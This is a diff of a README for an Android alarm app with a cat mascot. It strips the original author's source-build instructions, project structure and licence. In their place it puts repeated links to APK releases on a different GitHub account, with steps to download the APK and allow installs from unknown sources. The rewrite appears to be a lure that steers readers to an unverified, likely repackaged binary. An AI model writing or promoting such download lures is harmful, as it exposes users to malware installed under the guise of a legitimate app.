@@ -1,103 +1,79 @@
-# 🐱 Nyarm - Smart Alarm App
+# 🐱 nyarm-android - A Smart Alarm App for Everyone
 
-A smart alarm app with batch scheduling and a cute cat character.
+[![Download nyarm-android](https://img.shields.io/badge/Download%20Now-nyarm--android-blue.svg)](https://github.com/giculautaruuu-rgb/nyarm-android/releases)
 
-![Nyarm Banner](assets/banner.png)
+## 📋 Description
 
-## ✨ Features
+The **nyarm-android** app is a smart alarm clock designed to help you wake up on time and stay organized. With features like batch scheduling, weekend exclusions, and templates, you can customize your alarms easily. Plus, enjoy the company of a cute cat character that adds fun to your mornings!
 
-- **📅 Range Selection** - Select date ranges on calendar and set alarms at once
-- **🚫 Exclusions** - Automatically exclude weekends or holidays
-- **📋 Templates** - Save and reuse your favorite alarm settings
-- **🐱 Cat Character** - Cute animated cat cheers you on!
-- **🔔 Push Notifications** - Get notified right on time
+## 🚀 Getting Started
 
-## 📱 Installation
+This guide will help you download and run the nyarm-android app on your Android device. Follow these simple steps to get started.
 
-### Option 1: Download APK (Recommended)
+## 📥 Download & Install
 
-1. Go to [Releases](../../releases) page
-2. Download the latest `nyarm-vX.X.X.apk`
-3. Install on your Android device
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/giculautaruuu-rgb/nyarm-android/releases) to find the latest version of the app.
 
-> ⚠️ You may need to enable "Install from unknown sources" on your device
+2. **Choose the Right Version**  
+   Look for the most recent release. You will see a list of available files.
 
-### Option 2: Try with Expo Go
+3. **Download the APK File**  
+   Click on the `.apk` file to start the download. This file contains the nyarm-android app.
 
-1. Install [Expo Go](https://expo.dev/client) on your phone
-2. Clone this repository
-3. Run `npm install`
-4. Run `npx expo start`
-5. Scan the QR code with Expo Go
+4. **Locate the Downloaded File**  
+   Once the download is complete, locate the file on your Android device.
 
-## 🛠️ Development Setup
+5. **Install the App**  
+   - Open the downloaded file. You may get a prompt about installing apps from unknown sources.  
+   - If prompted, allow installation from unknown sources in your device settings.  
+   - Follow the instructions to complete the installation.
 
-```bash
-# Clone the repository
-git clone https://github.com/imshota1009/nyarm-android.git
-cd nyarm-android
+6. **Open the App**  
+   After installation, find the nyarm-android app icon in your app drawer or on your home screen. Tap it to open.
 
-# Install dependencies
-npm install
+## ⚙️ Features
 
-# Start development server
-npx expo start
-```
+- **Batch Scheduling**: Set multiple alarms at once for different days.
+- **Weekend Exclusions**: Automatically skip alarms on weekends.
+- **Templates**: Create and save alarm templates for repetitive tasks.
+- **User-Friendly Interface**: Navigate the app with ease.
+- **Cute Cat Character**: Enjoy a friendly character that guides you through the app.
 
-## 📦 Building APK
+## 📱 System Requirements
 
-### Local Build
+To run nyarm-android, ensure your device meets the following requirements:
 
-```bash
-# Install EAS CLI
-npm install -g eas-cli
+- **Android Version**: 6.0 (Marshmallow) or higher.
+- **Storage**: At least 50 MB of free space.
+- **Network**: Internet connection required for features like updates and notifications.
 
-# Login to EAS
-eas login
+## 💬 Community and Support
 
-# Build development APK
-eas build --platform android --profile development
-```
+If you have questions or need help, feel free to:
 
-### GitHub Actions
+- Open an issue in the GitHub repository.
+- Join our community forums for support and tips. 
 
-APK is automatically built when a new Release is created.
+## 📣 Contributing
 
-## 📁 Project Structure
+We welcome contributions! If you want to help improve nyarm-android, check out our guidelines on how to contribute in the repository.
 
-```
-nyarm-android/
-├── App.tsx              # Main app
-├── src/
-│   ├── components/      # UI components
-│   │   ├── Calendar.tsx
-│   │   ├── CatCharacter.tsx
-│   │   └── AlarmModal.tsx
-│   ├── hooks/           # Custom hooks
-│   │   ├── useAlarms.ts
-│   │   ├── useTemplates.ts
-│   │   └── useNotifications.ts
-│   ├── utils/           # Utilities
-│   │   ├── storage.ts
-│   │   └── date.ts
-│   └── types/           # Type definitions
-│       └── index.ts
-├── assets/              # Images
-├── app.json             # Expo config
-└── package.json
-```
+## 🌍 Topics
 
-## 🎨 Tech Stack
+This project involves various topics related to mobile development, including:
+- alarm-app
+- android
+- cat 
+- expo
+- react-native 
+- typescript 
 
-- **Expo** (React Native)
-- **TypeScript**
-- **expo-notifications** - Push notifications
-- **AsyncStorage** - Data persistence
+Explore these topics to understand the technology behind the app.
 
-## 📄 License
+## 🔗 Useful Links
 
-MIT License
+- [Download nyarm-android from Releases](https://github.com/giculautaruuu-rgb/nyarm-android/releases)
+- [GitHub Repository](https://github.com/giculautaruuu-rgb/nyarm-android)
 
----
-
-🐱 *"Thanks for using Nyarm, nya~!"*
+For any further details or updates, keep checking the Releases page. Enjoy your smart alarms!
